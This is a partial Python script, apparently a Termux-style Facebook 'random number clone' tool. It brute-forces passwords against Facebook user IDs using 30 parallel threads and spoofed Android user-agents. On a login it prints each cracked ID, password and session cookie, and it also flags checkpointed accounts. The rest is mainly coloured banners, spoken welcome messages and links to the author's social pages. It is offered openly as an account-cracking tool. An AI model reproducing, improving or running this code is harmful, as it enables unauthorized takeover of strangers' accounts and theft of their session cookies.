...
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    ...
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
os.system('xdg-open https://github.com/5UP3R1')
...
__________________________________________
  ...
  [Note: 50% Ok Account Open Just Now]
...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        os.system('espeak -a 200 "Welcome to A K world"')
        print("\033[1;32m__________________________________________")
        print(" [01] RANDOM  NUMBER CLONE [ULTRA WORK]")
        print(" [02] MY fACEBOOK ACCOUNT  [Aman Khan] ")
        print(" [00] Exit")
        print("\033[1;32m__________________________________________")
        Alif =input(" [?] Choose : ")
        os.system('xdg-open https://facebook.com/killer1314/')
        if Alif in ["1", "01"]:
            num()
        if Alif in ["2","02"]:
            os.system('xdg-open https://facebook.com/sorry1314')
        if Alif in [" 0", "00"]:
            exit()
        else:
            exit()
def num():
    ...
    with ThreadPool(max_workers=30) as noob:
        os.system('clear')
        print(logo)
        os.system('espeak -a 200 "Random cloning Started!"')
        tl = str(len(user))
        print("\033[1;32m__________________________________________")
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mAmaN\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[AmaN-OK] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[AmaN-CP🔪] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[AmaN🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()